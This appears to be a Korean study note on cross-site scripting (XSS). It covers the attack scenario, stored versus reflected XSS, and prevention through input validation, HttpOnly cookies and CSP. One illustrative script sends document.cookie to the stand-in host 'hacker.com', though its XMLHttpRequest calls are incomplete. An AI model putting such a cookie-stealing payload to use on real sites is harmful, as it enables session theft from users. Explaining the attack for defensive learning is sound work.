# XSS(Cross Site Scripting)

> `Cross Site Scripting`의 약자로 관리자가 아닌 사람이 악성 스크립트 코드를 삽입해 치명적인 오류를 발생시키거나 쿠키등을 탈취하는 공격이다.

- 다른 웹사이트와 정보를 교환하는 식으로 작동하므로 사이트간 스크립팅 이라고 부른다.

## XSS의 공격의 시나리오

1. 해커가 사전에 만든 웹페이지에 사용자가 브라우저로 액세스를 시도한다.
2. XSS공격 `link`가 포함된 웹페이지가 브라우저에 표시
3. 사용자가 `link`를 클릭
4. 사용자가 느끼지 못하는 사이 취약한 사이트에 있는 해커의 스크립트에 액세스 됨
5. 사용자의 웹 브라우저 상에서 해커의 스크립트가 실행된다.

```html
<script>
  let xmlHttp = new XMLHttpRequest();
  const url = "http://hacker.com" + document.cookie;
  xmlHttp.open();
  xmlHttp.send();
</script>
```

---

## XSS의 종류

- Stored-XSS
- Refleceted-XSS

## Stored-XSS(Persistent XSS)

> Stored XSS는 악성 스크립트가 취약한 웹사이트의 데이터베이스에 영구적으로 저장되는 유형이다.

- 사용자가 게시판이나 댓글 등에 입력한 데이터가 검증 없이 저장되고
- 이후 다른 사용자가 그 페이지를 방문할 때마다 해당 스크립트가 실행되는 것이다.  
*`Persisent` : 지속성있는

### 시나리오(Stored XSS)

- 공격자가 게시판에 악성 스크립트를 포함한 댓글을 작성
- 댓글을 읽는 모든 사용자의 브라우저에서 악성스크립트가 실행 
- 사용자가 원치 않는 행위 발생 

> 공격 범위가 넓고, 한번 공격이 이루어지면 많은 사용자에게 영향을 준다.
  
---
  
## Reflected XSS(Non-Persistent XSS)

> `Reflected XSS`는 사용자의 요청과 함께 악성 스크립트가 웹 서버로 전송되는 공격이다.

- 서버는 이 스크립트를 포함한 응답을 사용자에게 보낸다.
- 공격자는 이러한 스크립트가 포함된 URL을 희생자에게 보내는 방식으로 공격을 수행한다.

### 시나리오(Reflected XSS)

- 공격자는 악성스크립트가 포함된 URL을 희생자에게 보낸다.
- 희생자가 이 URL을 클릭한다.
- 웹 서버는 악성 스크립트를 포함한 응답을 보낸다.
- 희생자의 브라우저는 이 스크립트를 실행한다.

### 차이점

- `Stored XSS`는 웹사이트의 데이터베이스에 악성스크립트가 저장되어, 웹사이트 사용자가 특정 페이지를 로드할 때마다 스크립트가 실행되는 반면
- `Reflecetd XSS`는 사용자가 특정 `URL`을 로드할때마다 스크립트가 실행되는 구조이다.

### 예방 

- 입력값 검증
- `HTTPONly` 쿠키사용 : 이 옵션을 사용하면 스크립트를 통해 쿠키에 접근하는 것을 방지하여, 사용자 세션을 탈취하는 공격을 예방할 수 있습니다.
- `CSP(Content Security Policy)` : `CSP` 헤더를 사용하면 브라우저가 특정 출처에서만 스크립트를 로드하도록 할 수 있습니다. 이를 통해 악의적인 스크립트의 로드를 방지할 수 있습니다.

